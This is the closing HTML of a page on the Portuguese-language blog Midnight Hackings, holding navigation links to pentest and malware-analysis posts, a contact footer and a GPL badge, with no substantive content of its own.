                <a href="https://blog.midnighthackings.com/posts/my-journey-into-pentest-0x01/"><i class="fas fa-chevron-left"></i></a>
            
        </div>
        <a class="nav-top" href="#">top</i></a>
        <div class="nav-next">
            
                <a href="https://blog.midnighthackings.com/posts/malware-analysis-0x01/"><i class="fas fa-chevron-right"></i></a>
            
        </div>
    </div>
    

            </div><footer>
<div class="footer-content">

  <div class="contact-info">
      
          <div class="footer-mail">
          <i class="far fa-envelope"></i> <a href="mailto:midnight.reverser@outlook.com">midnight.reverser@outlook.com</a> </div>
      
      
  </div>


<img src="https://www.gnu.org/graphics/gplv3-with-text-136x68.png"/>
&nbsp;&nbsp;
<p class="copyright meta"> Midnight Hackings apoia GPL e o fim da escala 6x1!</p>

</div>
</footer></main>
    </body>
    <script src=https://blog.midnighthackings.com/js/navbutton.js></script>
</html>
